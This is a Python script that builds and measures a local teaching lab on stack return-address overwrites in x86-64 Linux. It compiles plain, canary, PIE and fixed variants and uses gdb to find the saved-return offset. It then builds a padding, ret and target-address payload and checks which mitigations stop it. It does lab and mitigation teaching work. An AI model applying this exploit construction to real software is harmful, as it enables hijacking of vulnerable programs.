#!/usr/bin/env python3
"""Build and measure the local x86-64 Lab 05; no external target is accepted."""
import argparse
from datetime import datetime, timezone
import hashlib
import json
import os
from pathlib import Path
import platform
import re
import resource
import shlex
import shutil
import signal
import struct
import subprocess
import sys

ROOT = Path(__file__).resolve().parents[1]
BINARIES = ("overwrite_plain", "overwrite_canary", "overwrite_pie", "overwrite_fixed")
TARGET_MARKER = b"TARGET: control flow redirected\n"
RETURNED = b"returned from copy_input\n"


def require(condition, message):
    if not condition:
        raise RuntimeError(str(message))


def capture(label, output):
    require(platform.system() == "Linux" and platform.machine() == "x86_64",
            "requires x86-64 Linux")
    require(os.geteuid() != 0, "run the lab as an ordinary user, not root")
    require(not any(char in str(output) for char in "\r\n"), "output path cannot contain newlines")
    cc = os.environ.get("CC", "gcc")
    for tool in (cc, "make", "nm", "readelf", "objdump", "gdb", "getconf"):
        require(shutil.which(tool), "required tool not found: " + tool)
    output.mkdir()  # Exclusive, including dangling symlinks.
    resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
    env = dict(os.environ, LC_ALL="C", SHELL="/bin/sh")

    def record(command, stem, **kwargs):
        (output / (stem + ".command.json")).write_text(json.dumps(command) + "\n")
        try:
            result = subprocess.run(command, capture_output=True, timeout=30, env=env, **kwargs)
        except subprocess.TimeoutExpired as error:
            (output / (stem + ".stdout.txt")).write_bytes(error.stdout or b"")
            (output / (stem + ".stderr.txt")).write_bytes(error.stderr or b"")
            (output / (stem + ".timeout.json")).write_text(json.dumps({"timeout_seconds": 30}) + "\n")
            raise
        (output / (stem + ".stdout.txt")).write_bytes(result.stdout)
        (output / (stem + ".stderr.txt")).write_bytes(result.stderr)
        (output / (stem + ".status.json")).write_text(json.dumps({"returncode": result.returncode}) + "\n")
        return result

    metadata = {"schema_version": 1, "label": label, "label_is_operator_supplied": True,
                "captured_at_utc": datetime.now(timezone.utc).isoformat(),
                "platform": platform.platform(), "architecture": platform.machine(),
                "python": sys.version, "CC": cc, "CFLAGS": env.get("CFLAGS", "-Wall -Wextra"),
                "LDFLAGS": env.get("LDFLAGS", ""),
                "aslr_before": Path("/proc/sys/kernel/randomize_va_space").read_text().strip()}
    (output / "environment.json").write_text(json.dumps(metadata, indent=2) + "\n")
    shutil.copy2(__file__, output / "capture-return-overwrite.py")
    shutil.copy2("/etc/os-release", output / "os-release.txt")
    lab = output / "05-return-address-overwrite"
    shutil.copytree(ROOT / "labs/05-return-address-overwrite/src", lab / "src")
    shutil.copy2(ROOT / "labs/05-return-address-overwrite/Makefile", lab)
    for name, command in (("compiler", [cc, "--version"]), ("compiler-target", [cc, "-dumpmachine"]),
                          ("binutils", ["readelf", "--version"]), ("gdb-version", ["gdb", "--version"]),
                          ("libc", ["getconf", "GNU_LIBC_VERSION"])):
        record(command, name).check_returncode()
    record(["make", "--always-make", "CC=" + cc, "CFLAGS=" + metadata["CFLAGS"],
            "LDFLAGS=" + metadata["LDFLAGS"]], "build", cwd=lab).check_returncode()
    (output / "safe.input").write_bytes(b"A" * 16)
    offsets = {}
    for binary in BINARIES:
        elf = record(["readelf", "-W", "-h", "-l", "-d", "-s", str(lab / binary)], binary + ".readelf")
        elf.check_returncode()
        text = elf.stdout.decode()
        require("Advanced Micro Devices X86-64" in text and "ELF64" in text, "unsupported ELF target")
        require(("__stack_chk_fail" in text) == (binary == "overwrite_canary"), "unexpected guard symbols")
        kind = re.search(r"Type:\s+(\w+)", text).group(1)
        require(kind == ("DYN" if binary == "overwrite_pie" else "EXEC"), "unexpected ELF type")
        stack = next(line for line in text.splitlines() if "GNU_STACK" in line)
        require("RW " in stack and "RWE" not in stack, "executable stack requested")
        require("GNU_RELRO" in text and "BIND_NOW" in text, "missing common linker hardening")
        record(["objdump", "-d", str(lab / binary)], binary + ".disassembly").check_returncode()
        # GDB's run command uses a shell for stdin redirection. Quote the path;
        # newline-containing output paths are rejected before creating evidence.
        probe = record(["gdb", "--nx", "--quiet", "--batch", "-iex", "set auto-load off",
                        "-ex", "set disable-randomization off", "-ex", "break copy_input",
                        "-ex", "run 16 < " + shlex.quote(str(output / "safe.input")),
                        "-ex", 'printf "LAB05_OFFSET=%ld\\n", (long)(($rbp + 8) - (long)&buffer)',
                        "-ex", "info frame", "--args", str(lab / binary)], "offset." + binary)
        probe.check_returncode()
        matches = re.findall(rb"LAB05_OFFSET=(\d+)", probe.stdout)
        require(len(matches) == 1, "GDB could not measure the saved-return offset")
        offsets[binary] = int(matches[0])
    require(offsets["overwrite_plain"] == offsets["overwrite_pie"], "PIE changed frame layout; comparison invalid")
    symbols = record(["nm", "--defined-only", str(lab / "overwrite_plain")], "symbols")
    symbols.check_returncode()
    match = re.search(rb"^([0-9a-fA-F]+)\s+[tT]\s+redirect_target$", symbols.stdout, re.MULTILINE)
    require(match, "redirect_target symbol not found")
    target_address = int(match[1], 16)
    disassembly = record(["objdump", "-d", "--disassemble=copy_input", str(lab / "overwrite_plain")], "copy-input")
    disassembly.check_returncode()
    returns = re.findall(rb"^\s*([0-9a-f]+):\s+c3\s+ret\s*$", disassembly.stdout, re.MULTILINE)
    require(len(returns) == 1, "expected one plain ret instruction in copy_input")
    alignment_ret = int(returns[0], 16)
    offset = offsets["overwrite_plain"]
    require(32 <= offset <= 112, "unsupported saved-return offset")
    payload = b"A" * offset + struct.pack("<QQ", alignment_ret, target_address)
    (output / "attack.input").write_bytes(payload)
    (output / "padding.input").write_bytes(b"A" * len(payload))
    payload_info = {"offsets": offsets, "padding_bytes": offset, "payload_bytes": len(payload),
                    "alignment_ret": hex(alignment_ret), "target_address": hex(target_address),
                    "address_source": "local non-PIE build artifacts; not an information disclosure",
                    "layout": "A * saved-return offset | little-endian ret | little-endian redirect_target"}
    (output / "payload.json").write_text(json.dumps(payload_info, indent=2) + "\n")
    # Stop at the first instruction, before redirect_target's prologue, to measure alignment.
    trace = record(["gdb", "--nx", "--quiet", "--batch", "-iex", "set auto-load off",
                    "-ex", "set disable-randomization off", "-ex", "break *redirect_target",
                    "-ex", "run {} < {}".format(len(payload), shlex.quote(str(output / "attack.input"))),
                    "-ex", 'printf "LAB05_TARGET_RSP_MOD16=%ld\\n", (long)$rsp % 16',
                    "-ex", "x/i $pc", "-ex", "continue", "--args", str(lab / "overwrite_plain")], "target-trace")
    trace.check_returncode()
    require(b"LAB05_TARGET_RSP_MOD16=8" in trace.stdout and TARGET_MARKER in trace.stdout,
            "redirect_target entry/alignment not observed")
    observations = []
    for binary in BINARIES:
        modes = ("safe", "attack", "padding") if binary == "overwrite_plain" else ("safe", "attack")
        for mode in modes:
            data = (output / (mode + ".input")).read_bytes()
            for repeat in range(1, 4):
                stem = "{}.{}.{}".format(binary, mode, repeat)
                result = record([str(lab / binary), str(len(data))], stem, input=data)
                row = {"binary": binary, "mode": mode, "repeat": repeat, "returncode": result.returncode,
                       "signal": signal.Signals(-result.returncode).name if result.returncode < 0 else None,
                       "target_reached": TARGET_MARKER in result.stdout, "returned_from_copy": RETURNED in result.stdout}
                observations.append(row)
                (output / "observations.json").write_text(json.dumps(observations, indent=2) + "\n")
                if mode == "safe":
                    require(result.returncode == 0 and row["returned_from_copy"] and not row["target_reached"], row)
                elif mode == "padding":
                    require(not row["target_reached"] and result.returncode != 42, row)
                elif binary == "overwrite_plain":
                    require(result.returncode == 42 and row["target_reached"] and not row["returned_from_copy"], row)
                elif binary == "overwrite_canary":
                    require(result.returncode == -signal.SIGABRT and b"stack smashing detected" in result.stderr
                            and not row["target_reached"], row)
                elif binary == "overwrite_fixed":
                    require(result.returncode == 2 and b"rejected:" in result.stderr
                            and b"copy completed:" not in result.stdout and not row["target_reached"], row)
                else:
                    require(result.returncode != 42 and not row["target_reached"], row)
    metadata["aslr_after"] = Path("/proc/sys/kernel/randomize_va_space").read_text().strip()
    (output / "environment.json").write_text(json.dumps(metadata, indent=2) + "\n")
    require(metadata["aslr_before"] == metadata["aslr_after"], "ASLR setting changed during capture")
    manifest = [hashlib.sha256(path.read_bytes()).hexdigest() + "  " + str(path.relative_to(output))
                for path in sorted(output.rglob("*")) if path.is_file()]
    (output / "SHA256SUMS").write_text("\n".join(manifest) + "\n")
    (output / "COMPLETE").write_text("Lab 05 checks passed; label: " + label + "\n")


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("label", choices=("host", "modern"))
    parser.add_argument("output", type=lambda value: Path(value).absolute())
    args = parser.parse_args()
    try:
        capture(args.label, args.output)
    except (OSError, ValueError, RuntimeError, StopIteration, subprocess.SubprocessError) as error:
        print("Capture failed (partial evidence retained): " + str(error), file=sys.stderr)
        return 1
    print("Lab 05 captured in " + str(args.output))
    return 0


if __name__ == "__main__":
    sys.exit(main())
